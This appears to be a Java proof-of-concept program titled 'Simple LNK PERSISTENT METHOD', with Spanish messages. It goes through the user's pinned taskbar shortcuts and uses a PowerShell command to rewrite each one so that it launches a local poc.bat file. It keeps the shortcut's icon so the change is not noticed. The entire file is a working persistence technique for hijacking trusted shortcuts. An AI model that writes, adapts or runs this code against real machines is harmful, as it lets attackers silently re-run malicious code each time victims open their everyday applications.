import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;

public class App {
    public static void main(String[] args) throws Exception {
         System.out.println("-----------------------------------------");
        System.out.println("Simple LNK PERSISTENT METHOD");
        System.out.println("Made by @ on github.");
        System.out.println("El acceso directo se creará en la misma carpeta del proyecto");
        System.out.println("-----------------------------------------");


      String taskbar = System.getenv("APPDATA") + "\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar";
    File carpeta = new File(taskbar);
    if (carpeta.exists() && carpeta.isDirectory()) {
            String[] archivos = carpeta.list();
            if (archivos != null) {
                for (String nombre : archivos) {
                    System.out.println(nombre);
                        try {
            String rutaLnk = taskbar + "\\" +nombre;
            String rutaTarget = System.getProperty("user.dir") + "\\poc.bat";
            String comando = "powershell -Command "
                    + "\"$WshShell = New-Object -ComObject WScript.Shell; "
                    + "$Shortcut = $WshShell.CreateShortcut('"+rutaLnk+"'); "
                    + "$Shortcut.TargetPath = '"+rutaTarget+"'; "
                    + "$Shortcut.WorkingDirectory = '"+System.getProperty("user.dir")+"'; "
                    + "$Shortcut.IconLocation = '"+rutaTarget+",0'; "
                    + "$Shortcut.Save()\"";
            String comando2 = "cmd /c echo completo";
            Process proceso = Runtime.getRuntime().exec(comando);

            BufferedReader reader = new BufferedReader(new InputStreamReader(proceso.getInputStream()));
            String linea;
            while ((linea = reader.readLine()) != null) {
                System.out.println(linea);
            }
        
            proceso.waitFor();
            System.out.println("Acceso directo creado correctamente en: " + rutaLnk);

        } catch (Exception e) {
            e.printStackTrace();
        }
    
    }
 }
}
 }
    

}
